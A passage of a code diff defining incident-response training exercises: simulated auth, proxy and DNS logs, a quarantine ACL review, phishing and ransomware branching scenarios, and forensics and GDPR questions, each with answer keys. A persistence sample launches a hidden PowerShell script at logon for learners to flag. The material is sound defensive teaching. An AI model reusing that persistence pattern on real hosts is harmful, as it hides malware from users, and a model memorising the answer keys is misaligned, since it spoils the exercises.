+  pre:['Training shell. The log file is logs/auth.log.','Tip: the command family is grep.','Output shape: matching syslog lines, one per login attempt.'],
+  accept:['^\\s*grep\\s+.*svc_sql.*auth\\.log'],
+  simOut:[
+    ['Mar 12 02:14:22 app01 sshd[2211]: Failed password for svc_sql from 203[.]0[.]113[.]44 port 51022 ssh2',
+     'Mar 12 02:14:29 app01 sshd[2211]: Failed password for svc_sql from 203[.]0[.]113[.]44 port 51024 ssh2',
+     'Mar 12 02:14:41 app01 sshd[2211]: Failed password for svc_sql from 203[.]0[.]113[.]44 port 51031 ssh2',
+     'Mar 12 02:15:02 app01 sshd[2211]: Accepted password for svc_sql from 203[.]0[.]113[.]44 port 51040 ssh2']
+  ],
+  canon:'grep svc_sql logs/auth.log',
+  hints:['The pattern is the username; the file comes last in a grep command.'],
+  explain:'grep PATTERN FILE prints every matching line. "grep svc_sql logs/auth.log" answers the question directly. The output shows three failed passwords and then an accepted login from the same 203[.]0[.]113[.]44 \u2014 the signature of a successful password guess. That accepted line is the exact moment the account was taken over, and it is what you would report and contain. Reversing pattern and file makes grep treat the username as a filename \u2014 a common slip.'
+},
+{
+  id:'m09', type:'spot', theme:'Containment', typeLabel:'Spot the mistake',
+  title:'Review the quarantine config',
+  scenario:'A colleague quarantined the host WEB-3 in the quarantine VLAN and left a change ticket with this config. You review it before approving. The SIEM log collector is 10[.]20[.]50[.]10 (syslog). The quarantine must stop attacker access but keep logging alive for the investigation.',
+  question:'There are exactly 2 mistakes in this config. Flag the 2 problematic lines.',
+  ansLabel:'FLAG THE MISTAKES \u2014 click a line to flag or unflag it',
+  lines:[
+    {t:'vlan 900 name QUARANTINE', bad:false},
+    {t:'ip route 0[.]0[.]0[.]0/0 via 10[.]20[.]99[.]1   # quarantine default route', bad:false},
+    {t:'access-list QUAR-IN permit ip host 10[.]20[.]44[.]7 any', bad:true},
+    {t:'access-list QUAR-IN permit udp host 10[.]20[.]44[.]7 host 10[.]20[.]50[.]11 eq 514', bad:true},
+    {t:'access-list QUAR-IN deny ip any any log', bad:false},
+    {t:'no ip domain-lookup on host WEB-3', bad:false}
+  ],
+  badCount:2,
+  hints:['One line lets the host talk to the whole world. Check where the syslog line actually sends its traffic.'],
+  explain:'Line 3 permits ALL traffic from the quarantined host to any destination \u2014 that is the opposite of quarantine; the host could still beacon out. Line 4 looks like the logging exception, but it sends syslog to 10[.]20[.]50[.]11 while the collector is 10[.]20[.]50[.]10 \u2014 so logs silently vanish and the quarantine becomes unwatchable. The correct pattern would target 10[.]20[.]50[.]10 exactly, with everything else denied and logged by line 5. Both mistakes share one theme: a quarantine you cannot see is a quarantine you cannot trust.'
+},
+{
+  id:'m10', type:'branch', theme:'Containment', typeLabel:'Branching scenario',
+  title:'Phishing at the sales team',
+  scenario:'A salesperson clicked a "shared invoice" link, entered her credentials on a fake page, and then called the helpdesk in a panic. You are running the phishing playbook.',
+  question:'Make each decision in order. Each choice changes what happens next.',
+  ansLabel:'MAKE EACH DECISION \u2014 one choice per step',
+  steps:[
+    { situation:'Step 1 \u2014 The user confirms she typed her username and password into the fake page 20 minutes ago. What do you do first?',
+      choices:[
+        {t:'Disable her account and reset her credentials, then check recent sign-ins', ok:true, outcome:'Account disabled before the attacker could reuse the password. Sign-in review shows no misuse yet.'},
+        {t:'Ask her to change the password herself when she has time', ok:false, outcome:'The password stays live for hours. Attackers automate reuse \u2014 this delay is how mailbox takeover happens.'},
+        {t:'Delete the phishing email from her mailbox and close the ticket', ok:false, outcome:'Deleting the email removes evidence. Her stolen credential is still valid somewhere else.'}
+      ]},
+    { situation:'Step 2 \u2014 The mailbox audit shows a new inbox rule "RSS Feeds" that forwards security alerts to an outside address. What next?',
+      choices:[
+        {t:'Remove the attacker\u2019s rule, audit all her mailbox rules and sign-in logs, and preserve the mailbox', ok:true, outcome:'The backdoor rule is gone, and the preserved mailbox lets you scope what the attacker read or sent.'},
+        {t:'Only delete the forwarding rule and move on', ok:false, outcome:'The rule is gone but you never scoped the access. If the attacker read customer threads, nobody knows.'},
+        {t:'Wipe and reimage her laptop as the main response', ok:false, outcome:'The laptop was never compromised \u2014 the mailbox was. You destroyed a working machine and fixed nothing.'}
+      ]},
+    { situation:'Step 3 \u2014 Cleanup is done. What closes the loop for this incident?',
+      choices:[
+        {t:'Block the sender domain, add a detection rule for this lure, and brief the team in the shift handover', ok:true, outcome:'The same lure now hits a rule instead of an inbox, and the next shift knows the pattern.'},
+        {t:'Tell the user to be more careful next time and close', ok:false, outcome:'User-blaming closes nothing: the lure still works on the next person who has not been trained.'},
+        {t:'Wait for the monthly security meeting to mention it', ok:false, outcome:'Weeks of delay let the same campaign run. Fast feedback is the point of lessons learned.'}
+      ]}
+  ],
+  hints:['Credentials typed on a fake page are already stolen \u2014 act on the account, not the email.'],
+  explain:'Stolen credentials must be cut off immediately: disable and reset, then check for misuse. Attacker inbox rules are persistence \u2014 remove them and audit the whole mailbox, preserving it as evidence. Closing the loop means turning the incident into detections and briefings, not lectures. The wrong paths share one flaw: they act on the visible object (email, laptop) instead of the access the attacker gained.'
+},
+{
+  id:'m11', type:'match', theme:'Containment', typeLabel:'Drag & drop matching',
+  title:'Containment techniques',
+  scenario:'You are coaching a junior analyst who keeps using "quarantine" for everything. You build this matching drill from your containment playbook so the vocabulary sticks.',
+  question:'Drag each technique onto its definition.',
+  ansLabel:'DRAG ITEMS TO SLOTS \u2014 one item per definition',
+  slots:[
+    {label:'Cut a single host off from all networks'},
+    {label:'Split the network into zones so infection cannot walk between them'},
+    {label:'Hold a suspicious file or host where it cannot execute'},
+    {label:'Take a system out of production completely'},
+    {label:'Redirect a malicious domain to a controlled server that answers with nothing'}
+  ],
+  items:[
+    {t:'Isolation', s:0},
+    {t:'Segmentation', s:1},
+    {t:'Quarantine', s:2},
+    {t:'Removal', s:3},
+    {t:'DNS sinkhole', s:4}
+  ],
+  hints:['Three techniques act on a host or a file, one carves the network into zones, one poisons DNS.'],
+  explain:'Isolation cuts one host off from everything \u2014 fast and surgical. Segmentation divides the network into zones so a breach in one zone stops at the border; it is containment designed before an incident. Quarantine holds something suspicious in a non-executing state (a pending file, a benched host). Removal takes a system out of production entirely. A DNS sinkhole answers a malicious name with a harmless address, killing the callback for every host at once. The junior\u2019s habit of calling everything quarantine hides which control actually fits.'
+},
+{
+  id:'m12', type:'qcm', theme:'Post-Incident & Program', typeLabel:'Multiple choice',
+  title:'Who hears about the breach first?',
+  scenario:'Your investigation confirms that a database export contains personal data of about 4,000 customers. The communication plan in the incident response plan lists a fixed sequence of internal consultations before any external notification goes out. Everyone around you has an opinion about what to announce and when.',
+  question:'According to standard breach-handling practice, who must be consulted before any external notification is drafted?',
+  ansLabel:'CHOOSE ONE',
+  options:[
+    {t:'Legal counsel and the privacy officer, to assess the notification duty', ok:true},
+    {t:'The affected customers, so they hear about the breach from us first', ok:false},
+    {t:'Marketing, so a blog post and social thread are ready to publish', ok:false},
+    {t:'All employees, in an all-hands email before anything leaks outside', ok:false}
+  ],
+  hints:['The plan decides who must be told \u2014 that is a legal question before it is a communication question.'],
+  explain:'Notification is a legal obligation with deadlines and defined audiences, so legal counsel or the privacy officer decides whether, when and how notification must happen. Telling customers first feels honourable but can breach the plan, miss regulator steps and create inconsistent statements. Marketing output before legal review risks admissions the company must stand behind. An all-hands email spreads details that become leaks. Consultation first, notification second \u2014 in the order the plan defines.'
+}
+);
+
+</script>
+<script>
+/* ===== MEDIUM exercises 13-18 ===== */
+EX.push(
+{
+  id:'m13', type:'logview', theme:'Detection & Analysis', typeLabel:'Log analysis',
+  title:'Proxy logs: rhythm gives it away',
+  scenario:'You are reviewing last night\u2019s proxy log for the sales subnet. One internal host stands out. Use the filter box if the wall of lines gets noisy \u2014 that is what it is for.',
+  question:'What is the best interpretation of the highlighted host\u2019s behaviour, and what should you do?',
+  ansLabel:'CHOOSE ONE',
+  logs:[
+    '23:00:02 proxy ACCEPT 10[.]30[.]8[.]51 -> cdn-vendor[.]example:443 GET /js/app.js UA=Chrome/126 size=182344',
+    '23:00:44 proxy ACCEPT 10[.]30[.]8[.]19 -> updates[.]example:443 GET /win/manifest UA=Windows-Update size=881',
+    '23:01:02 proxy ACCEPT 10[.]30[.]8[.]51 -> cdn-vendor[.]example:443 GET /css/main.css UA=Chrome/126 size=40211',
+    '23:01:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=212',
+    '23:02:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=208',
+    '23:03:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=221',
+    '23:04:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=214',
+    '23:05:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=207',
+    '23:05:47 proxy ACCEPT 10[.]30[.]8[.]51 -> cdn-vendor[.]example:443 GET /img/hero.png UA=Chrome/126 size=95112',
+    '23:06:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=219',
+    '23:07:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=216',
+    '23:08:15 proxy ACCEPT 10[.]30[.]8[.]63 -> hxxp://cdn-metrics[.]example/api/v2/telemetry POST UA=Mozilla/5.0 (compatible; Updater) size=222'
+  ],
+  options:[
+    {t:'C2 beaconing \u2014 machine-regular POSTs and a fake Updater agent; escalate and contain 10[.]30[.]8[.]63', ok:true},
+    {t:'A legitimate metrics SDK \u2014 the fixed interval proves a scheduler; allow and close the alert', ok:false},
+    {t:'A backup job stuck retrying \u2014 block the destination until IT repairs the schedule', ok:false},
+    {t:'Browser prefetch of marketing analytics \u2014 record it and take no further action', ok:false}
+  ],
+  hints:['Filter for 8[.]63 and look at the seconds column and the user-agent.'],
+  explain:'10[.]30[.]8[.]63 sends a small POST to the same path every 60 seconds \u2014 exactly on the second \u2014 with a static fake "Updater" user-agent and near-identical tiny sizes. That metronome rhythm is an indicator of attack (IoA): behaviour that shows an attack is happening right now, while the fake domain behind it is the indicator of compromise (IoC) you would block. Escalate and prepare containment. The 8[.]51 host shows normal browsing (varied paths and sizes); the update host fetches a manifest once. Backup jobs transfer large blocks, not 210-byte POSTs, and prefetch does not come from a fake Updater agent.'
+},
+{
+  id:'m14', type:'multi', theme:'Evidence & Forensics', typeLabel:'Multi-select',
+  title:'Handling the disk from LT-214',
+  scenario:'LT-214 is confirmed compromised and will be rebuilt. Your team lead hands you the original drive and says: "Anything you do with this disk must survive a court question twelve months from now."',
+  question:'Select ALL handling actions that are correct for the original evidence drive.',
+  ansLabel:'SELECT ALL THAT APPLY',
+  options:[
+    {t:'Record a SHA-256 hash of the drive image and store it with the case notes', ok:true},
+    {t:'Work from verified copies of the image, never from the original', ok:true},
+    {t:'Log every person who touches the evidence, with times and purpose', ok:true},
+    {t:'Use a write blocker when imaging the original drive', ok:true},
+    {t:'Boot the original drive briefly to check the malware is really there', ok:false},
+    {t:'Keep the drive in your desk drawer until the case closes', ok:false}
+  ],
+  hints:['Two wrong options each break one core principle: don\u2019t alter evidence, and don\u2019t lose custody of it.'],
+  explain:'Evidence survives court through integrity and documented handling: hash it (SHA-256 proves nothing changed), analyse only verified copies, record chain of custody for every touch, and use a write blocker so imaging cannot alter the original. Booting the original mounts and changes it \u2014 timestamps, registry, even malware state \u2014 and the defence will show it. A desk drawer is not custody: access is uncontrolled and undocumented. Both wrong picks destroy the "integrity" story; the four right picks are the story.'
+},
+{
+  id:'m15', type:'terminal', theme:'Containment', typeLabel:'Terminal',
+  title:'Find the beaconing process',
+  scenario:'Host WS-77 is in the quarantine VLAN but still shows outbound attempts. Before you kill anything, the playbook says: identify the exact process so the eradication step can remove it, not just the connection.',
+  question:'Use a netstat command to list active connections with process IDs (PIDs). Flag hint: the Windows combination that shows PIDs uses three flags \u2014 all connections, numeric output, owning process. Output shape: a table with Proto, Local Address, Foreign Address, State and PID columns.',
+  ansLabel:'TYPE THE COMMAND \u2014 then press Enter, then Check',
+  host:'analyst@WS-77',
+  pre:['Training shell (Windows-flavoured netstat available).','Output shape: header "Active Connections", then rows ending in a PID number.'],
+  accept:['^\\s*netstat\\s+(?=.*-a)(?=.*-n)(?=.*-o)'],
+  simOut:[
+    ['Active Connections',
+     '  Proto  Local Address            Foreign Address           State           PID',
+     '  TCP    10[.]20[.]5[.]44:49712    198[.]51[.]100[.]23:443    ESTABLISHED     4812',
+     '  TCP    10[.]20[.]5[.]44:49744    203[.]0[.]113[.]77:443    TIME_WAIT       4812',
+     '  UDP    10[.]20[.]5[.]44:5353     *:*                                      1512',
+     '(tasklist /fi "PID eq 4812" would show powershell.exe \u2014 the beacon source)']
+  ],
+  canon:'netstat -ano',
+  hints:['The flags are -a (all), -n (numeric) and -o (PIDs); order of flags does not matter.'],
+  explain:'netstat -ano lists every connection (-a) without name lookups (-n) and maps each to its owning PID (-o). The output pins the beacon on PID 4812, which the tasklist line reveals as powershell.exe. That single mapping is what turns "something beacons" into "this process beacons", which is the input eradication needs. Without -o you get connections but no process; without -n, lookups slow output and can hang; without -a you miss listening sockets.'
+},
+{
+  id:'m16', type:'order', theme:'Recovery', typeLabel:'Timeline ordering',
+  title:'Bring SRV-09 back safely',
+  scenario:'SRV-09 was hit by a cryptominer dropped through an unpatched web app. Containment and eradication are done: the host was reimaged and the flaw patched. The recovery phase starts now, and your change ticket must show the steps in the right order.',
+  question:'Drag the recovery steps into the correct order.',
+  ansLabel:'ORDER THE STEPS',
+  ordered:[
+    'Verify the offline backup copy is clean and complete',
+    'Rebuild SRV-09 from the known-good image',
+    'Restore application data from the verified backup',
+    'Test the service in an isolated segment before go-live',
+    'Return SRV-09 to production with increased monitoring',
+    'Get the service owner\u2019s sign-off and document the closure'
+  ],
+  hints:['Never restore data you have not verified, and never test in production.'],
+  explain:'Recovery is a chain of trust: first prove the backup itself is clean and complete \u2014 restoring a poisoned backup reinfects the host. Then rebuild from the known-good image, then restore the verified data onto the clean build. Testing happens in an isolated segment so a surprise costs nothing. Return to production happens with increased monitoring because reinfection attempts often come back to a freshly restored host. Owner sign-off and documentation close the loop formally. Restoring before verifying, or skipping the isolated test, are the two classic shortcuts that reopen incidents.'
+},
+{
+  id:'m17', type:'triage', theme:'Post-Incident & Program', typeLabel:'Alert triage',
+  title:'Assign the severity',
+  scenario:'Five new tickets arrive at once. Your escalation matrix (P1 respond now \u00b7 P2 same shift \u00b7 P3 this week \u00b7 P4 backlog) decides who gets woken up. Assign each ticket its severity.',
+  question:'Choose the correct severity for each ticket.',
+  ansLabel:'CLASSIFY EACH TICKET \u2014 one choice per row',
+  opts:['P1 \u2014 Critical','P2 \u2014 High','P3 \u2014 Medium','P4 \u2014 Low'],
+  rows:[
+    {t:'Ransomware is actively encrypting the finance file cluster right now', meta:'EDR \u00b7 ongoing', a:0},
+    {t:'A user reports a phishing email they did not open or click', meta:'Mail gateway \u00b7 report', a:3},
+    {t:'Confirmed exfiltration of customer personal data to an external host', meta:'DLP \u00b7 confirmed', a:0},
+    {t:'Encrypted laptop reported stolen; disk encryption on, no sign of access', meta:'Helpdesk \u00b7 report', a:2},
+    {t:'Critical vulnerability exposed on a border service, no exploitation seen yet', meta:'Scanner \u00b7 finding', a:1}
+  ],
+  hints:['Ask: is harm happening now, is harm likely but not started, or is this a formality?'],
+  explain:'Active encryption and confirmed exfiltration are harm in progress \u2014 P1, respond now. A reported phishing email with no click is a hygiene item \u2014 P4 backlog. A stolen but encrypted laptop with no access evidence is a process matter \u2014 P3: report, track, verify. A critical exposed vulnerability is likely harm that has not started \u2014 P2: fix this shift before it becomes a P1. Severity is about immediacy and confirmed impact, not about how scary the words sound.'
+},
+{
+  id:'m18', type:'qcm', theme:'Eradication', typeLabel:'Multiple choice',
+  title:'Clean or reimage?',
+  scenario:'The antivirus removed three malware files from HR-PC-12 and declared it clean. The user wants the laptop back before lunch. Your eradication playbook has a decision gate at exactly this point.',
+  question:'What does the playbook\u2019s eradication gate say and why?',
+  ansLabel:'CHOOSE ONE',
+  options:[
+    {t:'Reimage from a known-good image \u2014 cleaners miss the persistence attackers leave', ok:true},
+    {t:'Accept the antivirus verdict; the scan covered every file on the disk', ok:false},
+    {t:'Reimage only because it is faster than cleaning the user profile', ok:false},
+    {t:'Run a second antivirus product; two clean scans mean the host is safe', ok:false}
+  ],
+  hints:['What do attackers install so a single file deletion is not enough?'],
+  explain:'Antivirus removes the files it recognises. Attackers expect that and add persistence \u2014 scheduled tasks, run keys, services, WMI subscriptions \u2014 that redownloads or reactivates the malware. A reimage from a known-good image is the only reset that guarantees none of that survives, which is why the gate demands it. The reason is not speed (the speed-based option draws a true conclusion from a false premise), and scanner agreement proves only that both miss the same thing. Eradication means the attacker\u2019s foothold is gone, not just the visible symptom.'
+}
+);
+
+</script>
+<script>
+/* ===== MEDIUM exercises 19-24 ===== */
+EX.push(
+{
+  id:'m19', type:'fill', theme:'Containment', typeLabel:'Fill in the blanks',
+  title:'Containment playbook sentences',
+  scenario:'You are updating the containment chapter of the IR playbook. The sentences below will be read under pressure at 3 a.m., so every blank must carry the exact concept \u2014 no synonyms.',
+  question:'Complete each sentence with the correct term from the word bank.',
+  ansLabel:'COMPLETE THE BLANKS \u2014 two bank words are decoys',
+  text:'Choose the least disruptive containment method that still stops the spread, because every option carries a different {{0}}. Take a {{1}} of the host before wiping it. {{2}} every account the attacker could have reached. Record all actions with {{3}} taken from one agreed time source, and {{4}} the stakeholders listed in the communication plan.',
+  bank:['business impact','forensic image','Reset','timestamps','notify','backup','encrypt'],
+  blanks:[{a:'business impact'},{a:'forensic image'},{a:'Reset'},{a:'timestamps'},{a:'notify'}],
+  hints:['The blanks name a cost, an evidence artefact, an account action, a time record, and a communication action.'],
+  explain:'Containment always trades security against the business \u2014 that cost is the business impact of the method you pick. A forensic image taken before wiping preserves what the eradication step would otherwise destroy. Resetting accounts closes the credential path attackers reuse. Timestamps from one agreed source keep the timeline usable in the report and in court. Notifying stakeholders per the plan keeps legal, management and the IR team moving in step. "Backup" and "encrypt" are decoys \u2014 a backup is not evidence of the live compromise, and encryption is not a containment verb here.'
+},
+{
+  id:'m20', type:'match', theme:'Post-Incident & Program', typeLabel:'Drag & drop matching',
+  title:'Who owns what in a major incident',
+  scenario:'A P1 data-breach incident has just been declared. The incident manager reads out the roles from the communication plan. Match each party to the responsibility it owns during the incident.',
+  question:'Drag each party onto the responsibility it owns.',
+  ansLabel:'DRAG ITEMS TO SLOTS',
+  slots:[
+    {label:'Decides on regulatory notification duties and legal exposure'},
+    {label:'Handles employee-related violations and interview logistics'},
+    {label:'Owns all public statements and press responses'},
+    {label:'Performs rebuilds, restores and technical containment work'},
+    {label:'Makes business-impact decisions such as taking a service offline'},
+    {label:'Provides on-call external forensic specialists when depth is needed'}
+  ],
+  items:[
+    {t:'Legal counsel', s:0},
+    {t:'Human Resources', s:1},
+    {t:'Public relations', s:2},
+    {t:'IT operations', s:3},
+    {t:'Senior management', s:4},
+    {t:'DFIR retainer partner', s:5}
+  ],
+  hints:['Only one party may speak publicly; only one decides whether the law requires telling anyone.'],
+  explain:'Legal counsel owns the regulatory question \u2014 what must be reported, to whom, by when. HR owns the people process when an employee is involved. Public relations owns every external word, so the company speaks with one voice. IT operations does the hands-on work: rebuilds, restores, blocking. Senior management owns business decisions like pulling a revenue service offline \u2014 that is a business risk call, not a technical one. A DFIR retainer is the pre-paid contract that puts external forensic specialists on the phone within hours; negotiating one mid-incident costs days.'
+},
+{
+  id:'m21', type:'logview', theme:'Detection & Analysis', typeLabel:'Log analysis',
+  title:'DNS that carries cargo',
+  scenario:'The DNS resolver flagged an internal host for volume. You pull the DNS query log. The resolver team says "it is just TXT records, DNS always looks like that" \u2014 verify with your own eyes.',
+  question:'What is happening, and what is the right next step?',
+  ansLabel:'CHOOSE ONE',
+  logs:[
+    '14:02:11 dns QUERY 10[.]40[.]2[.]17 A  teams[.]example NXDOMAIN 41ms',
+    '14:02:12 dns QUERY 10[.]40[.]2[.]17 TXT t7zk4m2q9v1x.kyo[.]example NOERROR 88ms',
+    '14:02:13 dns QUERY 10[.]40[.]2[.]17 TXT w2f9p0r3s8l5.kyo[.]example NOERROR 91ms',
+    '14:02:14 dns QUERY 10[.]40[.]2[.]17 TXT b8n1c6d2h7j4.kyo[.]example NOERROR 89ms',
+    '14:02:16 dns QUERY 10[.]40[.]2[.]17 TXT m4q8t1w5z9e3.kyo[.]example NOERROR 90ms',
+    '14:02:17 dns QUERY 10[.]40[.]2[.]17 A  sharepoint[.]example NOERROR 22ms',
+    '14:02:18 dns QUERY 10[.]40[.]2[.]17 TXT k2v6x0b4f8n2.kyo[.]example NOERROR 92ms',
+    '14:02:19 dns QUERY 10[.]40[.]2[.]17 TXT p9d3h7l1r5t9.kyo[.]example NOERROR 88ms',
+    '14:02:21 dns QUERY 10[.]40[.]2[.]17 TXT s4g8k2o6u0y4.kyo[.]example NOERROR 90ms',
+    '14:02:23 dns QUERY 10[.]40[.]2[.]17 TXT x1a5e9i3m7q1.kyo[.]example NOERROR 91ms'
+  ],
+  options:[
+    {t:'DNS tunneling \u2014 random TXT labels at machine speed; escalate and block the domain', ok:true},
+    {t:'A misconfigured NTP client retrying in a loop \u2014 fix the client configuration', ok:false},
+    {t:'Normal CDN prefetching \u2014 TXT records are harmless lookups, so allow them', ok:false},
+    {t:'Printer discovery traffic \u2014 forward it to the facilities team instead', ok:false}
+  ],
+  hints:['Filter for TXT and look at the label pattern and the query rate.'],
+  explain:'TXT queries exist for legitimate protocols, but not like this: one query per second, each with a long, random-looking label under the same zone kyo[.]example. That is the shape of DNS tunneling \u2014 data is encoded into the queried names, and the TXT answers carry output back. It is a covert channel that ignores almost every firewall rule. The correct move is to escalate the IoC and block the domain at the resolver, cutting the channel for every host at once. NTP, CDN and printer traffic do not send novel random labels every second.'
+},
+{
+  id:'m22', type:'multi', theme:'Post-Incident & Program', typeLabel:'Multi-select',
+  title:'What the lessons-learned review must produce',
+  scenario:'Two weeks after the VPN appliance breach, you chair the lessons-learned session. The CISO asks for the agenda outcomes in writing before the meeting, so the review does not end as a chat.',
+  question:'Select ALL outcomes that belong to a proper lessons-learned review.',
+  ansLabel:'SELECT ALL THAT APPLY',
+  options:[
+    {t:'A corrected incident timeline with times confirmed from logs', ok:true},
+    {t:'Detection improvement actions, such as new SIEM rules', ok:true},
+    {t:'Response-time metrics (MTTD / MTTR) compared to targets', ok:true},
+    {t:'An updated playbook reflecting what this incident taught', ok:true},
+    {t:'A named person to blame for clicking the phishing link', ok:false},
+    {t:'A decision on the next tabletop exercise date and scenario', ok:false},
+    {t:'A list of the tools the attackers used, for the report only', ok:false}
+  ],
+  hints:['The review fixes the system, not the person; two outcomes measure the response, two change future practice.'],
+  explain:'A lessons-learned review produces change: a verified timeline (accuracy first), detection actions such as new SIEM rules from the IoCs, MTTD/MTTR metrics compared against targets so improvement is measurable, and a playbook update so next time starts ahead. The verified timeline also feeds the damage assessment and the after-action report the CISO signs off. Naming and shaming a user is not an outcome \u2014 it teaches people to hide incidents. A tabletop date is useful but is program scheduling, not a review output. A plain list of attacker tools documents what happened without changing anything; the value is what the tools reveal about gaps. Four correct picks here.'
+},
+{
+  id:'m23', type:'spot', theme:'Eradication', typeLabel:'Spot the mistake',
+  title:'Persistence hiding in the schedule',
+  scenario:'HR-PC-12 was "cleaned" by antivirus, but the host still phones out. You list the scheduled tasks and startup entries. Something is keeping the malware alive between reboots.',
+  question:'There are exactly 2 persistence mechanisms. Flag the 2 suspicious lines.',
+  ansLabel:'FLAG THE MISTAKES \u2014 click a line to flag or unflag it',
+  lines:[
+    {t:'Task "GoogleUpdateTask" \u00b7 runs daily \u00b7 C:\\Program Files\\Google\\Update\\GoogleUpdate.exe', bad:false},
+    {t:'Task "Updater" \u00b7 runs at logon \u00b7 powershell.exe -nop -w hidden -f C:\\Users\\Public\\upd.ps1', bad:true},
+    {t:'Run key HKCU\\...\\Run "OneDrive" = C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe', bad:false},
+    {t:'Run key HKCU\\...\\Run "SysHelper" = C:\\Windows\\Temp\\sysc.exe', bad:true},
+    {t:'Task "Adobe Acrobat Update Task" \u00b7 runs daily \u00b7 C:\\Program Files\\Adobe\\AAC\\AcrobatUpdate.exe', bad:false},
+    {t:'Task "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag" \u00b7 weekly \u00b7 defrag.exe', bad:false}
+  ],
+  badCount:2,
+  hints:['Vendor tasks live in Program Files. Ask where each binary sits and whether a script tool is hidden.'],
+  explain:'Line 2 is a scheduled task that launches a hidden PowerShell script from the user-writable Public folder at every logon \u2014 no vendor ships updates that way, and -w hidden is a concealment flag. Line 4 is a run key pointing into C:\\Windows\\Temp, a folder no legitimate signed binary calls home; the name "SysHelper" is generic on purpose. The real vendor entries (lines 1, 5, 6) run signed binaries from Program Files or the Microsoft task folder. Eradication must remove the mechanism AND the payload file, or the malware returns at the next logon.'
+},
+{
+  id:'m24', type:'branch', theme:'Recovery', typeLabel:'Branching scenario',
+  title:'Ransomware on FS-02',
+  scenario:'FS-02 (file server) is encrypting files. Backups exist: one synced network copy and one offline tape from last night. You are the responder; every decision shapes how this ends.',
+  question:'Make each decision in order.',
+  ansLabel:'MAKE EACH DECISION \u2014 one choice per step',
+  steps:[
+    { situation:'Step 1 \u2014 Encryption is confirmed running on FS-02. Your first move?',
+      choices:[
+        {t:'Isolate FS-02 from the network while keeping it powered on', ok:true, outcome:'Encryption stops spreading; RAM and running state stay available for the investigation.'},
+        {t:'Power FS-02 off immediately', ok:false, outcome:'Spread stops, but you lose RAM evidence and risk corrupting the volume mid-encryption.'},
+        {t:'Let it finish encrypting to see which files are hit', ok:false, outcome:'Every minute costs more files. Observation is never worth live damage.'}
+      ]},
+    { situation:'Step 2 \u2014 You must choose the restore source. The network backup is reachable from FS-02\u2019s segment; the tape is offline in the vault. Which do you use?',
+      choices:[
+        {t:'Restore from the offline tape after verifying it scans clean', ok:true, outcome:'The offline copy is outside the attacker\u2019s reach, so it cannot carry the encryptor back.'},
+        {t:'Restore from the network backup \u2014 it is fresher', ok:false, outcome:'Ransomware hunts backup shares first. A fresher copy that was reachable may be encrypted or poisoned.'},
+        {t:'Restore from whichever is faster without checking', ok:false, outcome:'Speed without verification is how reinfection happens on day one.'}
+      ]},
+    { situation:'Step 3 \u2014 FS-02 is rebuilt and data is restored. What must happen before the service goes back to users?',
+      choices:[
+        {t:'Patch the entry flaw, reset exposed credentials, and watch the host with increased monitoring', ok:true, outcome:'The original path is closed, stolen credentials are useless, and monitoring would catch a quick return.'},
+        {t:'Go live \u2014 the host is clean and users are angry', ok:false, outcome:'The entry path is still open. Ransomware crews re-enter through the same door within days.'},
+        {t:'Wait a week before going live so things calm down', ok:false, outcome:'A week of downtime with no containment logic behind it \u2014 recovery is about verified readiness, not waiting.'}
+      ]}
+  ],
+  hints:['The offline copy exists exactly because ransomware attacks reachable backups.'],
+  explain:'Isolate while powered: stop the spread, keep the evidence. Restore from the offline tape \u2014 ransomware deliberately attacks network backups first, so the offline copy is the trustworthy one; verify before restoring. Going live is only safe after the entry flaw is patched, exposed credentials are reset, and monitoring is raised, because crews commonly retry the same route. "Let it finish" and "go live angry" are the two decisions that turn a one-server incident into a domain-wide one.'
+}
+);
+
+</script>
+<script>
+/* ===== MEDIUM exercises 25-30 ===== */
+EX.push(
+{
+  id:'m25', type:'qcm', theme:'Post-Incident & Program', typeLabel:'Multiple choice',
+  title:'The GDPR clock',
+  scenario:'Your company operates in the EU. At 10:00 on Tuesday the investigation confirms that a misconfigured storage bucket exposed personal data of EU residents, and the data was accessed. Legal asks you, the responder, when the regulator notification deadline falls.',
+  question:'Under GDPR, by when must the supervisory authority be notified?',
+  ansLabel:'CHOOSE ONE',
+  options:[
+    {t:'Within 72 hours of becoming aware of the breach', ok:true},
+    {t:'Within 30 days of the investigation closing', ok:false},
+    {t:'Within 7 days, only if data was encrypted', ok:false},
+    {t:'Only after the root cause analysis is approved by the board', ok:false}
+  ],
+  hints:['The clock starts when the organisation becomes aware \u2014 not when the report is finished.'],
+  explain:'GDPR sets 72 hours from the moment the organisation becomes aware of a personal-data breach to notify the supervisory authority; awareness here is Tuesday 10:00, so the deadline is Friday 10:00. The clock does not wait for the investigation to close or for board approvals \u2014 you may notify in phases as facts firm up. (In a US healthcare case the same question is answered by HIPAA: individuals within 60 days and the regulator alongside.) Encryption is relevant to whether individuals must be told, not to a 7-day rule; there is no 7-day authority deadline. Responder timelines feed legal\u2019s compliance clock, so your timestamps matter.'
+},
+{
+  id:'m26', type:'order', theme:'Containment', typeLabel:'Prioritization',
+  title:'Containment priority ranking',
+  scenario:'Five systems across the estate show findings at the same time. Your containment capacity is two hosts per hour. The incident manager wants the order now, with domain-impact first.',
+  question:'Drag the systems into containment priority order (first = contain first).',
+  ansLabel:'RANK THE SYSTEMS \u2014 drag to reorder',
+  ordered:[
+    'DC-01 \u2014 domain controller showing active compromise by an unknown process',
+    'PAY-1 \u2014 payment server with a confirmed webshell',
+    'DEV-3 \u2014 developer laptop with malware but no admin rights',
